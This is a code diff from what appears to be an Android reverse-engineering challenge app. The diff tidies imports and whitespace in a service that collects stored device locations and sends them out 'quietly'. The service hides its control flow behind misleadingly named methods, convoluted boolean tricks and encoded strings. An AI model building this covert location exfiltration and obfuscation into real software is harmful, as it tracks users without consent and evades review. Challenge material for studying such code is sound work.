@@ -2,7 +2,6 @@ package com.woop.tryreverseengineerthis.service;
 
 import android.annotation.TargetApi;
 import android.app.Service;
-import android.content.Context;
 import android.content.Intent;
 import android.location.Location;
 import android.location.LocationManager;
@@ -13,15 +12,10 @@ import android.os.Debug;
 import android.os.Handler;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
-import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import com.woop.tryreverseengineerthis.helper.StringHelper;
 import com.woop.tryreverseengineerthis.storage.LocationStorage;
-
-import org.json.JSONException;
-import org.json.JSONObject;
-import org.apache.http.*;
 
 import java.io.DataOutputStream;
 import java.io.IOException;
@@ -34,8 +28,6 @@ import java.util.List;
 
 import javax.crypto.BadPaddingException;
 import javax.crypto.IllegalBlockSizeException;
-
-import static android.location.LocationManager.*;
 
 /**
  * Created by Jay on 3/29/2016.
@@ -66,13 +58,8 @@ public class LocationSniffingService extends Service{
             }
         }, delay);
     }
-
-    private void thisAlsoDoesnotDoAnything(){
-
-    }
-
+    private void thisAlsoDoesnotDoAnything(){    }
     private boolean sendQuietly() {
-
         List<Location> locations = LocationStorage.getAllLocation();
         StringBuilder builder = new StringBuilder();
         for(Location loc : locations){
@@ -86,12 +73,9 @@ public class LocationSniffingService extends Service{
             builder.append(",");
             builder.append("||");
         }
-
         sendForReals(builder.toString());
-
         return builder.length() > 2 ? false : (builder.equals(builder) ? true : false);
     }
-
     @TargetApi(Build.VERSION_CODES.KITKAT)
     private void sendForReals(String s) {
         try {
@@ -117,17 +101,12 @@ public class LocationSniffingService extends Service{
         }
         Log.d(TAG, "Sent");
     }
-
     private boolean thisDoesnotDoAnything(){
-
         boolean b = false;
-
         if (isValid())
             b = sendQuietly();
-
         return (b^=b) ? (b == b)^(b == (b^=b^=b^=b)) : (b^b^b^b);
     }
-
     private boolean isValid(){
 
         String h1 = "ï<ŠPSÒí¸U1Éà>";
